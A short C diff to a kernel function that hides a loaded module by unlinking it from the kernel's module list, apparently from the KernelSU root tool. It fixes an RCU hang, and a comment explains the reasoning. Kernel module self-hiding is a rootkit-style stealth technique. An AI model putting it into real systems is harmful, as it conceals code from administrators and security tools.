@@ -104,10 +104,14 @@ static void ksu_hide_module(void)
     }
 
     mutex_lock(module_mutex_ptr);
-    if (!list_empty(&mod->list)) {
+    if (!list_empty(&mod->list))
         list_del_rcu(&mod->list);
-        INIT_LIST_HEAD(&mod->list);
-    }
+    /* Do NOT reinitialize mod->list here: list_del_rcu deliberately
+     * preserves the forward link so an in-flight RCU reader (proc/modules
+     * or kallsyms iteration) can walk past this node; INIT_LIST_HEAD would
+     * turn it into a self-loop and spin that reader forever. The stale
+     * links are never revisited in this profile: the module is pinned
+     * until reboot and no unload path runs. */
     mutex_unlock(module_mutex_ptr);
 
     __module_get(mod);
